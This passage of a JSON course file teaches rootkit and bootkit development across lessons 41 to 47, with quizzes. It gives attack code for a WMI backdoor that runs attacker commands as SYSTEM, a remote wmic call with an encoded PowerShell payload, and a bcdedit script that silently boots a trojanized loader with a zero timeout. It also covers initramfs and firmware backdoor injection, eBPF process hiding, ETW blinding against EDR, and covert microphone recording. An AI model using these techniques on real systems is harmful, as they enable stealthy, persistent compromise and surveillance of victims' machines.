                "Implement advanced PowerShell-based rootkit techniques."
            ],
            "content": {
                "overview": "This lesson focuses on advanced, Windows-specific rootkit techniques that leverage modern kernel frameworks. We will explore how to use the official Microsoft Filter Manager and Windows Filtering Platform to create powerful and stable hooks, how to evade the ETW logging system, and how to abuse WMI for stealthy persistence and communication.",
                "sections": [
                    {
                        "title": "Filter Manager and WFP Hooking",
                        "content": "<p>Instead of unstable SSDT hooks, modern rootkits use the officially supported filtering frameworks built into Windows.</p><ul><li><strong>Filter Manager:</strong> A kernel component that manages file system and registry filter drivers. A rootkit can register its own filter driver to intercept and modify any file or registry operation. This is much more stable than older techniques.</li><li><strong>Windows Filtering Platform (WFP):</strong> The core of the Windows firewall. A rootkit can install a 'callout driver' into WFP to inspect, modify, or drop any network packet, giving it complete control over the network stack.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "ETW (Event Tracing for Windows) Bypass",
                        "content": "<p>ETW is a high-speed, kernel-level logging system that is heavily used by modern EDRs to get visibility into system activity. A sophisticated rootkit must blind this system.</p><p><strong>Real-world Example:</strong> An EDR uses a specific ETW provider to get notified about all process creation events. A rootkit can identify the session that the EDR is using and, with kernel privileges, can patch the session's configuration in memory to disable that specific provider. The EDR's logging for process creation is now silently turned off, making the rootkit's subsequent actions invisible to it.</p>",
                        "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "WMI Provider Rootkits",
                        "content": "<p>A rootkit can install its own malicious WMI provider. This allows it to create a new WMI namespace that can be used for stealthy persistence and C&C. The attacker can then use standard WMI client tools to remotely execute methods on their malicious provider, which will run with SYSTEM privileges. This makes the C&C traffic look like legitimate WMI network traffic, which is common in enterprise environments.</p>",
                        "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "WMI Provider Backdoor (Conceptual)",
                        "language": "c",
                        "code": "// This is conceptual C++ code for a malicious WMI provider.\n\n// 1. The rootkit registers a new WMI class, e.g., 'Malicious_Control'.\n// 2. This class has a method, e.g., 'ExecuteCommand(string command)'.\n\n// 3. This is the implementation of that method.\n//    When an attacker calls this WMI method remotely, this code runs as SYSTEM.\nHRESULT Malicious_Control::ExecuteCommand(BSTR command) {\n    // Create a new process using the command string provided by the attacker.\n    CreateProcess(NULL, command, ...);\n    return S_OK;\n}\n\n// 4. Attacker's remote command (using standard Windows tools):\n//    wmic /node:VICTIM_IP /user:ADMIN /password:PASS process call create \"powershell.exe -e [payload]\""
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "A modern, stable Windows rootkit that wants to intercept and hide file access would most likely use which technique?",
                        "options": [
                            "SSDT Hooking",
                            "A file system filter driver using the Filter Manager framework.",
                            "DLL Injection",
                            "Process Hollowing"
                        ],
                        "correct": 1,
                        "explanation": "Filter drivers are the Microsoft-supported way to intercept I/O. Using this framework makes a rootkit more stable (less likely to cause a BSOD) and stealthier than older, unsupported techniques like SSDT hooking."
                    },
                    {
                        "id": 2,
                        "question": "The low-level, high-speed logging framework in Windows that is heavily used by EDRs for visibility is known as:",
                        "options": [
                            "The Windows Event Log",
                            "The MFT",
                            "Event Tracing for Windows (ETW)",
                            "The Registry"
                        ],
                        "correct": 2,
                        "explanation": "ETW is the primary source of behavioral data for modern security tools. Therefore, bypassing or blinding ETW is a key goal for a sophisticated rootkit that wants to evade EDR."
                    },
                    {
                        "id": 3,
                        "question": "What is a primary advantage for an attacker using a malicious WMI provider for C&C?",
                        "options": [
                            "It is the only way to get SYSTEM privileges.",
                            "It makes the C&C traffic look like legitimate Windows administrative traffic, which is less likely to be blocked or flagged as suspicious.",
                            "It does not require kernel privileges.",
                            "It is easier than writing a PowerShell script."
                        ],
                        "correct": 1,
                        "explanation": "Abusing WMI for C&C is a powerful 'living-off-the-land' technique. The C&C communication is tunneled through a standard, trusted Windows protocol, making it blend in with normal network activity."
                    }
                ]
            }
        },
        {
            "id": "lesson-42",
            "title": "Windows Boot Process Exploitation",
            "duration": "100 min",
            "objectives": [
                "Modify the Windows Boot Manager and Boot Configuration Data (BCD).",
                "Exploit the Windows PE loader to inject code.",
                "Develop rootkits that can run inside the Hyper-V hypervisor.",
                "Achieve persistence by modifying the Windows Recovery Environment (WinRE)."
            ],
            "content": {
                "overview": "This lesson focuses on the advanced exploitation of the Windows-specific boot process. We will explore how to manipulate the Boot Configuration Data, exploit the Windows loader itself, and achieve persistence in the hidden Windows Recovery Environment to create a bootkit that is both stealthy and resilient.",
                "sections": [
                    {
                        "title": "BCD Manipulation",
                        "content": "<p>The Boot Configuration Data (BCD) is a firmware-independent database that contains the boot-time configuration for Windows. It is the modern replacement for the old `boot.ini` file.</p><p>An attacker with administrative privileges can use the built-in `bcdedit.exe` tool to create a new boot entry that loads a malicious, trojanized version of the Windows bootloader. This is a simple but effective way to hijack the boot process.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hyper-V Rootkits",
                            "content": "<p>When Windows runs with Virtualization-Based Security (VBS) enabled, the main OS is actually running inside a virtual machine managed by the Hyper-V hypervisor. This creates a new, highly privileged target for a rootkit.</p><p>A hypervisor rootkit (as discussed in Lesson 24) in this environment would compromise the Hyper-V hypervisor itself. This would give it complete control over the main Windows OS running as its 'guest', and would make it invisible to any security software running inside that guest, including Kernel Patch Protection.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Windows Recovery Environment (WinRE) Exploitation",
                            "content": "<p>WinRE is a hidden partition on the disk that contains a lightweight version of Windows used for recovery and repair. An attacker can mount this partition and trojanize the legitimate recovery tools (like `Startup Repair`) with their own malware. The next time the user has a problem and boots into WinRE, they will be unknowingly running the attacker's code with high privileges. This is a very stealthy persistence mechanism as the main OS is offline and most security tools do not scan the WinRE partition.</p>",
                            "image": "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "BCD Tampering Techniques (bcdedit)",
                            "language": "powershell",
                            "code": "# This PowerShell script uses the built-in bcdedit tool to hijack the boot process.\n# This requires administrative privileges to run.\n\n# 1. Make a copy of the legitimate Windows bootloader.\ncopy C:\\Windows\\System32\\winload.efi C:\\Windows\\System32\\winload_trojan.efi\n\n# 2. Patch 'winload_trojan.efi' with a malicious payload.\n# (This step would involve a separate binary patching tool).\n\n# 3. Create a new boot entry that points to our trojanized bootloader.\nbcdedit /copy {current} /d \"Malicious Boot Entry\"\n# This will return a new GUID for the entry.\n\n# 4. Set the path for the new entry to our malicious file.\n$new_guid = \"{...}\"\nbcdedit /set $new_guid path \\Windows\\System32\\winload_trojan.efi\n\n# 5. Set our new entry as the default, but with a zero-second timeout so the user\n#    doesn't see the boot menu.\nbcdedit /default $new_guid\nbcdedit /timeout 0\n\n# Now, the next time the system boots, it will silently load our malicious bootloader."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The firmware-independent database that contains the boot-time configuration for a modern Windows system is known as the:",
                            "options": [
                                "The MBR",
                                "The Registry",
                                "The Boot Configuration Data (BCD)",
                                "The SAM file"
                            ],
                            "correct": 2,
                            "explanation": "The BCD is the central store for all boot configuration on a modern Windows system. Manipulating it with tools like `bcdedit` is a key technique for a bootkit."
                        },
                        {
                            "id": 2,
                            "question": "When Windows is running with Virtualization-Based Security (VBS) enabled, the main operating system is actually running where?",
                            "options": [
                                "Directly on the hardware.",
                                "Inside a virtual machine controlled by the Hyper-V hypervisor.",
                                "On a remote server in the cloud.",
                                "From a USB drive."
                            ],
                            "correct": 1,
                            "explanation": "VBS uses virtualization to create a hardware-enforced security boundary. The main 'host' OS is actually run as a guest VM, while a small, secure kernel runs in the more privileged hypervisor to protect it."
                        },
                        {
                            "id": 3,
                            "question": "What makes the Windows Recovery Environment (WinRE) an attractive place for a rootkit to achieve persistence?",
                            "options": [
                                "It is not an attractive target.",
                                "It is a hidden partition that is not part of the live OS and is often not scanned by security software.",
                                "It is easy to delete.",
                                "It contains all the user's passwords."
                            ],
                            "correct": 1,
                            "explanation": "WinRE is a trusted recovery environment. By trojanizing its tools, an attacker can achieve a very stealthy persistence mechanism that the user themselves will trigger when they try to repair their system."
                        }
                    ]
                }
            },
            {
                "id": "lesson-43",
                "title": "Linux Advanced Kernel Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Manipulate Netlink sockets to intercept kernel-user space communication.",
                    "Develop a rootkit using eBPF for stealthy monitoring and filtering.",
                    "Exploit vulnerabilities to escape from a container to the host kernel.",
                    "Hijack SystemD services for persistence.",
                    "Bypass mandatory access control systems like SELinux and AppArmor."
                ],
                "content": {
                    "overview": "This lesson covers the development of advanced rootkits that target the unique features of the modern Linux kernel. We will explore how to abuse eBPF for stealthy filtering, how to escape from containers, and how to bypass the powerful mandatory access control systems that are designed to prevent these very attacks.",
                "sections": [
                    {
                        "title": "eBPF Rootkit Development",
                        "content": "<p>The extended Berkeley Packet Filter (eBPF) is a powerful and flexible framework in the Linux kernel that allows for the creation of sandboxed programs that can be attached to various kernel hooks to monitor and manipulate system behavior. While it is a revolutionary tool for legitimate tracing and networking, it can also be abused to create a very stealthy and powerful rootkit.</p><p>An attacker with root privileges can load a malicious eBPF program. This program can attach itself to a kernel function (a 'kprobe') or a system call and can be used to filter or manipulate data, effectively creating a hook without having to modify any kernel code or tables. This makes it much harder to detect than a traditional LKM-based rootkit.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Container Escape Techniques",
                            "content": "<p>As discussed, the most powerful way to escape a Linux container is to exploit a vulnerability in the shared host kernel.</p><p><strong>Real-world Example:</strong> A vulnerability is found in a kernel file system driver (e.g., ext4). An attacker who has compromised a container can create a special, malformed disk image file *inside* the container and then try to mount it. When the host kernel's vulnerable file system driver tries to parse this malicious image, the exploit is triggered. Because the vulnerable code is running in the host kernel, the attacker's shellcode also runs in the host kernel (Ring 0), completely bypassing the container's isolation and giving them a root shell on the host machine.</p>",
                            "image": "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "SELinux/AppArmor Bypass",
                            "content": "<p>SELinux and AppArmor are Mandatory Access Control (MAC) systems. They are designed to confine even the `root` user by enforcing a strict, system-wide security policy.</p><p>Bypassing a MAC system is extremely difficult. It typically requires either finding a misconfiguration in the policy itself, or finding a kernel exploit that allows the attacker to gain the `CAP_MAC_OVERRIDE` capability, which allows them to disable the MAC system altogether. A rootkit that can bypass or disable SELinux has achieved a very high level of sophistication.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "eBPF Stealth Program (Conceptual)",
                            "language": "c",
                            "code": "// This is a conceptual eBPF program written in a C-like syntax.\n// It demonstrates how to hook the 'execve' system call to hide a process execution.\n\n#include <linux/bpf.h>\n\n// Define the BPF map to store the PID to hide\nstruct bpf_map_def SEC(\"maps\") pid_to_hide_map = {\n    .type = BPF_MAP_TYPE_HASH,\n    .key_size = sizeof(u32),\n    .value_size = sizeof(u8),\n    .max_entries = 1,\n};\n\n// Attach this program to the entry point of the execve syscall\nSEC(\"kprobe/sys_execve\")\nint bpf_prog1(struct pt_regs *ctx) {\n    char filename[128];\n    // Get the filename from the context\n    bpf_probe_read_user_str(&filename, sizeof(filename), (void *)PT_REGS_PARM1(ctx));\n\n    // If the filename matches our malware, we could take action.\n    // A more advanced rootkit could use this to manipulate arguments\n    // or prevent the execution from being logged by other security tools.\n    if (strcmp(filename, \"/usr/bin/malware\") == 0) {\n        // ... malicious action ...\n    }\n\n    return 0;\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A powerful and modern framework in the Linux kernel that allows for the creation of sandboxed programs to safely monitor and manipulate system behavior, which can also be abused to create a stealthy rootkit, is known as:",
                            "options": [
                                "Netfilter",
                                "eBPF (extended Berkeley Packet Filter)",
                                "SELinux",
                                "Systemd"
                            ],
                            "correct": 1,
                            "explanation": "eBPF is a revolutionary technology in the Linux kernel. It allows for a new class of rootkits that are much stealthier than traditional LKMs because they don't require modifying any kernel code or data structures."
                        },
                        {
                            "id": 2,
                            "question": "What is the most effective way for an attacker inside a Docker container to compromise the underlying host machine?",
                            "options": [
                                "By running a web browser.",
                                "By exploiting a vulnerability in the shared host kernel.",
                                "By filling up the container's disk space.",
                                "By sending a phishing email."
                            ],
                            "correct": 1,
                            "explanation": "Because all containers on a host share the same kernel, a kernel exploit is a 'get out of jail free' card. Code execution in the kernel from inside a container means code execution on the host, completely bypassing the container's isolation."
                        },
                        {
                            "id": 3,
                            "question": "SELinux and AppArmor are examples of what kind of security system?",
                            "options": [
                                "A firewall",
                                "An antivirus",
                                "A Mandatory Access Control (MAC) system",
                                "A password manager"
                            ],
                            "correct": 2,
                            "explanation": "MAC systems are a powerful defense that can confine even a compromised root user. Bypassing a well-configured MAC policy is a significant challenge for any attacker."
                        }
                    ]
                }
            },
            {
                "id": "lesson-44",
                "title": "Linux Boot Process Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Modify the GRUB bootloader to inject code.",
                    "Manipulate the initramfs to achieve pre-kernel persistence.",
                    "Bypass kernel module signing protections.",
                    "Exploit the EFI stub loader for early boot execution.",
                    "Achieve persistence in the Linux recovery mode."
                ],
                "content": {
                    "overview": "This lesson focuses on the Linux boot process, exploring the techniques used to create a Linux bootkit. We will learn how to hijack the GRUB bootloader, manipulate the initial RAM disk (initramfs), and bypass kernel module signing to load a rootkit before the main operating system takes control.",
                "sections": [
                    {
                        "title": "GRUB Bootloader Modification",
                        "content": "<p>GRUB (Grand Unified Bootloader) is the most common bootloader for Linux. Its configuration file (`grub.cfg`) and its core image are stored on the boot partition.</p><p>An attacker with root privileges can modify the `grub.cfg` file to add a new menu entry that loads a malicious, modified version of the Linux kernel. A more advanced attack involves patching the GRUB core image itself to inject a small payload that runs even before the GRUB menu is displayed.</p>",
                            "image": "https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "initramfs Manipulation",
                            "content": "<p>The `initramfs` (initial RAM file system) is a compressed archive that contains all the drivers and tools needed to mount the real root file system. It is loaded into memory by the bootloader, and the kernel is then executed from within it.</p><p><strong>Real-world Example:</strong> An attacker with root access can unpack the legitimate `initramfs` archive, add their malicious rootkit driver (`rootkit.ko`) and a startup script to it, and then repack the archive. The next time the system boots, the bootloader will load the malicious `initramfs`. The startup script will run and load the rootkit driver into the kernel before the real file system is even mounted. This is an extremely powerful and effective persistence mechanism on Linux.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Kernel Module Signing Bypass",
                            "content": "<p>Like Windows, modern Linux systems with Secure Boot enabled will often enforce that all kernel modules must be cryptographically signed. Bypassing this is a key goal for a bootkit.</p><p>A common bypass is to use the `MOK (Machine Owner Key)` facility. An attacker with physical access or root privileges can enroll their own public key into the MOK database. They can then sign their malicious kernel module with their private key. Because the public key is now trusted by the firmware, the kernel will allow the malicious driver to be loaded, even with Secure Boot enabled.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "initramfs Backdoor Injection (Conceptual)",
                            "language": "bash",
                            "code": "# This is a conceptual script for injecting a backdoor into the initramfs.\n# This requires root privileges.\n\n# 1. Go to a temporary directory\nmkdir /tmp/initramfs_work\ncd /tmp/initramfs_work\n\n# 2. Find the current initramfs image and unpack it.\n# The file is a CPIO archive compressed with gzip.\ngzip -dc /boot/initrd.img-$(uname -r) | cpio -id\n\n# 3. Add our malicious components.\n#    a. Copy our pre-compiled rootkit kernel module.\ncp /path/to/rootkit.ko ./lib/modules/\n\n#    b. Create a malicious startup script.\ncat > ./etc/init.d/malicious_startup << EOF\n#!/bin/sh\ninsmod /lib/modules/rootkit.ko\nEOF\nchmod +x ./etc/init.d/malicious_startup\n\n# 4. Repack the initramfs archive.\nfind . | cpio --create --format='newc' | gzip -9 > /boot/initrd.img-malicious\n\n# 5. Update the GRUB configuration to boot from our malicious initramfs.\n# (This would involve editing /boot/grub/grub.cfg)"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the most common bootloader used by Linux distributions?",
                            "options": [
                                "NTLDR",
                                "bootmgr",
                                "GRUB (Grand Unified Bootloader)",
                                "BIOS"
                            ],
                            "correct": 2,
                            "explanation": "GRUB is the standard bootloader for the vast majority of Linux systems. Manipulating its configuration or core image is a primary vector for a Linux bootkit."
                        },
                        {
                            "id": 2,
                            "question": "The compressed archive that contains the initial set of drivers and tools needed to mount the main root file system is known as the:",
                            "options": [
                                "The kernel",
                                "The initramfs (initial RAM file system)",
                                "The MBR",
                                "The system call table"
                            ],
                            "correct": 1,
                            "explanation": "The initramfs is a critical part of the modern Linux boot process. Because it is a simple file archive, an attacker with root can easily unpack it, add a malicious rootkit, and repack it to achieve pre-kernel persistence."
                        },
                        {
                            "id": 3,
                            "question": "An attacker with root access on a Linux machine can bypass kernel module signing by doing what?",
                            "options": [
                                "Disabling the network card.",
                                "Deleting the kernel.",
                                "Enrolling their own public key into the Machine Owner Key (MOK) database, which makes their signatures trusted.",
                                "It cannot be bypassed."
                            ],
                            "correct": 2,
                            "explanation": "The MOK system is designed to allow users to sign their own third-party drivers. This legitimate feature can be abused by an attacker with root privileges to sign their malicious rootkit, allowing it to be loaded even when Secure Boot is active."
                        }
                    ]
                }
            },
            {
                "id": "lesson-45",
                "title": "Multi-OS Rootkit Frameworks",
                "duration": "100 min",
                "objectives": [
                    "Design a cross-platform abstraction layer for a rootkit.",
                    "Develop a unified API for common rootkit functions.",
                    "Implement platform-specific modules for Windows, Linux, and macOS.",
                    "Create universal persistence mechanisms that can adapt to the target OS.",
                    "Design a cross-platform C&C protocol."
                ],
                "content": {
                    "overview": "This lesson focuses on the advanced software engineering required to build a rootkit that can operate on multiple operating systems. We will design a modular, cross-platform framework that separates the core logic from the OS-specific implementation details, allowing for the creation of a truly universal implant.",
                "sections": [
                    {
                        "title": "Cross-Platform Abstraction Layers",
                        "content": "<p>A cross-platform rootkit is built with a modular architecture that uses a Platform Abstraction Layer (PAL).</p><h3>The Architecture:</h3><ul><li><strong>Core Agent:</strong> The high-level logic of the rootkit, written in a portable language like C++.</li><li><strong>Platform Abstraction Layer (PAL):</strong> A set of generic interfaces (e.g., `hide_process()`, `establish_persistence()`).</li><li><strong>Platform-Specific Modules:</strong> Separate modules for Windows, Linux, and macOS that implement the PAL interfaces using the native techniques for each OS.</li></ul><p>This design allows the core agent to be written once, and only the small platform-specific modules need to be changed to support a new OS.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Universal Persistence Mechanisms",
                            "content": "<p>The core agent can call a generic `establish_persistence()` function. The PAL then directs this call to the correct platform-specific module. On Windows, this might create a Registry Run key. On Linux, it might create a systemd service. On macOS, it might create a Launch Agent. The core logic is abstracted from the implementation.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cross-OS Communication Protocols",
                            "content": "<p>The C&C protocol is designed to be universal. The C2 server can send a generic command like `DOWNLOAD_EXECUTE` along with a URL. The platform-specific module on each OS is then responsible for translating that into the correct set of actions (e.g., using `WinINet` on Windows, or `curl`/`wget` on Linux) to download and run the file.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Multi-OS Rootkit Framework (Conceptual C++)",
                            "language": "cpp",
                            "code": "// --- pal.h (The common header file) ---\nclass IPlatform {\npublic:\n    virtual bool HideProcess(int pid) = 0;\n};\n\n// --- pal_windows.cpp ---\nclass WindowsPlatform : public IPlatform {\npublic:\n    bool HideProcess(int pid) override {\n        // Implement process hiding using Windows-specific DKOM ...\n        return true;\n    }\n};\n\n// --- pal_linux.cpp ---\nclass LinuxPlatform : public IPlatform {\npublic:\n    bool HideProcess(int pid) override {\n        // Implement process hiding using Linux-specific task_struct manipulation ...\n        return true;\n    }\n};\n\n// --- core_agent.cpp (The main, cross-platform code) ---\nIPlatform* g_platform_api;\n\nint main() {\n#if defined(_WIN32)\n    g_platform_api = new WindowsPlatform();\n#elif defined(__linux__)\n    g_platform_api = new LinuxPlatform();\n#endif\n    g_platform_api->HideProcess(1234);\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary benefit of using a Platform Abstraction Layer (PAL) in a cross-platform rootkit?",
                            "options": [
                                "It makes the rootkit larger.",
                                "It separates the core logic from the OS-specific implementation, allowing for easier development and maintenance.",
                                "It only works on Windows.",
                                "It encrypts the rootkit's communications."
                            ],
                            "correct": 1,
                            "explanation": "A PAL is a standard software engineering pattern. It is the key to writing portable code by creating a generic interface that different platform-specific modules can implement."
                        },
                        {
                            "id": 2,
                            "question": "In a cross-platform rootkit, where would the code for manipulating the Windows EPROCESS structure be located?",
                            "options": [
                                "In the Core Agent.",
                                "In the Platform Abstraction Layer (PAL) header.",
                                "In the Windows-specific platform module.",
                                "In the Linux-specific platform module."
                            ],
                            "correct": 2,
                            "explanation": "All the low-level, OS-specific code is contained within the platform modules. The Windows module would contain the DKOM code for `EPROCESS`, while the Linux module would contain the code for `task_struct`."
                        },
                        {
                            "id": 3,
                            "question": "The core logic of a cross-platform rootkit is typically written in a portable, high-level language like:",
                            "options": [
                                "Bash",
                                "PowerShell",
                                "C or C++",
                                "HTML"
                            ],
                            "correct": 2,
                            "explanation": "C and C++ are the languages of choice for system-level programming and are highly portable, making them ideal for the core logic of a cross-platform rootkit."
                        }
                    ]
                }
            },
            {
                "id": "lesson-46",
                "title": "Embedded and IoT Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Develop rootkits for embedded Linux systems.",
                    "Analyze the challenges of exploiting Real-Time Operating Systems (RTOS).",
                    "Perform firmware modification to install a persistent rootkit.",
                    "Manipulate the Hardware Abstraction Layer (HAL).",
                    "Exploit common IoT network protocols for C&C."
                ],
                "content": {
                    "overview": "This lesson focuses on the unique challenges of developing rootkits for the constrained and diverse world of embedded and IoT devices. We will explore how to gain root on embedded Linux systems, the difficulties of analyzing real-time operating systems, and the techniques for firmware modification and hardware abstraction layer manipulation.",
                "sections": [
                    {
                        "title": "Embedded Linux Rootkits",
                        "content": "<p>Many IoT devices (routers, cameras, etc.) run a stripped-down version of Linux. The techniques for developing a rootkit are similar to a standard Linux rootkit, but with some key differences.</p><h3>Challenges:</h3><ul><li><strong>Constrained Resources:</strong> The rootkit must be extremely small and efficient to run on a device with very little RAM and a slow CPU.</li><li><strong>Read-Only File Systems:</strong> Many embedded devices mount their root file system as read-only. This means a rootkit cannot achieve persistence by simply writing a file. Persistence often requires re-flashing the firmware or using a writable partition like `/data`.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Real-Time OS (RTOS) Exploitation",
                            "content": "<p>Many smaller, specialized embedded systems (like those in industrial control or automotive) run a Real-Time Operating System (RTOS). An RTOS is a very simple OS with no memory protection and a single address space. A vulnerability in any part of the code can typically overwrite any other part of the code or data, making exploitation easier but also making the system very easy to crash. Reverse engineering an RTOS requires a deep understanding of the specific hardware and is a highly specialized skill.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hardware Abstraction Layer (HAL) Manipulation",
                            "content": "<p>The HAL is the layer of software that provides a consistent interface for the OS to interact with the hardware. By manipulating the HAL, a rootkit can lie to the OS about the state of the hardware.</p><p><strong>Real-world Example:</strong> A rootkit on an Android phone wants to record audio without the user's knowledge. The Android OS knows that the microphone is active and might display an indicator in the UI. The rootkit can compromise the HAL for the audio device. It can then modify the code to always report the microphone's status as 'off' to the upper levels of the OS, even when the rootkit has it physically turned on and is actively recording.</p>",
                            "image": "https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Embedded Rootkit Development (Firmware Patching)",
                            "language": "bash",
                            "code": "# This conceptual script demonstrates the process of patching an embedded device's firmware\n# to add a rootkit.\n\nFIRMWARE_IMAGE=\"firmware.bin\"\nROOTKIT_BINARY=\"rootkit.so\"\n\n# 1. Unpack the firmware image using binwalk.\nbinwalk -e $FIRMWARE_IMAGE\n\n# 2. Navigate to the extracted root file system.\ncd _firmware.bin.extracted/squashfs-root\n\n# 3. Copy the rootkit into the file system.\ncp /path/to/$ROOTKIT_BINARY ./usr/lib/\n\n# 4. Modify a startup script to load our rootkit.\n# For example, add 'LD_PRELOAD=/usr/lib/rootkit.so /usr/bin/some_app' to a startup script.\n# This will load our rootkit into a legitimate application at startup.\necho \"LD_PRELOAD=/usr/lib/rootkit.so /usr/bin/some_app &\" >> ./etc/init.d/rcS\n\n# 5. Re-pack the file system and firmware.\n# This requires a toolchain specific to the target device to create a new, valid firmware image.\n# create_new_firmware(...)\n\n# The new, trojanized firmware can now be flashed to the device."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is a major challenge for a rootkit trying to achieve persistence on an embedded Linux device?",
                            "options": [
                                "The devices are too fast.",
                                "The root file system is often mounted as read-only, preventing the simple creation of new files.",
                                "The devices are not connected to the internet.",
                                "The devices do not run the Linux kernel."
                            ],
                            "correct": 1,
                            "explanation": "A read-only file system is a common security feature on embedded devices. This forces an attacker to use more advanced persistence techniques, such as modifying the initramfs or re-flashing the entire firmware."
                        },
                        {
                            "id": 2,
                            "question": "The software layer that provides a consistent interface for the operating system to interact with the device's hardware is known as the:",
                            "options": [
                                "The application layer",
                                "The file system",
                                "The Hardware Abstraction Layer (HAL)",
                                "The network stack"
                            ],
                            "correct": 2,
                            "explanation": "The HAL is a key target for a sophisticated rootkit, as compromising it allows the rootkit to lie to the operating system about the true state of the hardware."
                        },
                        {
                            "id": 3,
                            "question": "A simple, lightweight operating system with no memory protection, often used in industrial or automotive systems, is known as a:",
                            "options": [
                                "Windows",
                                "Linux",
                                "Real-Time Operating System (RTOS)",
                                "macOS"
                            ],
                            "correct": 2,
                            "explanation": "RTOSs are designed for deterministic, real-time performance, often at the expense of security features like memory protection. This makes them a very different and unique target for a researcher."
                        }
                    ]
                }
            },
            {
                "id": "lesson-47",
                "title": "GPU and Hardware Rootkits",
                "duration": "100 min",
                "objectives": [
                    "Exploit GPU computing frameworks to hide malicious code.",
                    "Develop a proof-of-concept graphics driver rootkit.",
                    "Analyze and bypass the security of a Trusted Platform Module (TPM).",
                    "Understand how hardware-based attestation can be bypassed.",
                    "Discuss the challenges of exploiting and analyzing hardware security modules (HSMs)."
                ],
                "content": {
                    "overview": "This lesson explores the development of rootkits that target the hardware and firmware of specialized components. We will cover how to abuse the powerful parallel processing of a GPU to hide malicious computations and how to attack the very hardware designed to be the 'root of trust' for a system, such as the Trusted Platform Module.",
                "sections": [
                    {
                        "title": "GPU Computing Exploitation",
                        "content": "<p>A modern Graphics Processing Unit (GPU) is a powerful computer in its own right, with its own memory (VRAM) and thousands of processing cores. This can be abused by a rootkit.</p><h3>Techniques:</h3><ul><li><strong>Hiding Data:</strong> A rootkit can store its code and data in VRAM. Most forensic and security tools are only designed to scan system RAM, making the VRAM an effective hiding place.</li><li><strong>Hiding Computations:</strong> A computationally expensive malicious task, like cracking passwords or mining cryptocurrency, can be offloaded to the GPU. This hides the activity from the main CPU, so the user will not see a spike in CPU usage in their Task Manager.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Graphics Driver Rootkits",
                            "content": "<p>The graphics driver is one of the most complex and privileged components in a modern operating system. A vulnerability in the graphics driver can be exploited to gain kernel-level execution. A rootkit implemented as a malicious or trojanized graphics driver could be extremely powerful, with the ability to not only hide its own activity but also to manipulate what the user sees on the screen.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "TPM and HSM Bypass",
                            "content": "<p>A Trusted Platform Module (TPM) is a dedicated crypto-processor chip on a motherboard designed to be a hardware 'root of trust'. It is used for things like storing BitLocker keys and performing remote attestation.</p><p><strong>Real-world Example: TPM Attestation Bypass.</strong> Remote attestation is a process where a server can verify that a client machine is in a known-good, un-tampered state. The TPM measures the hashes of all the boot components (firmware, bootloader, kernel) and signs these measurements with a private key that never leaves the TPM. The server can then verify this signature to 'attest' that the client has not been modified. An attacker could try to bypass this by finding a flaw in the TPM's firmware itself, or more commonly, by finding a vulnerability in the software on the main CPU that allows them to intercept and feed fake, 'good' measurements to the TPM, tricking it into signing a false attestation.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
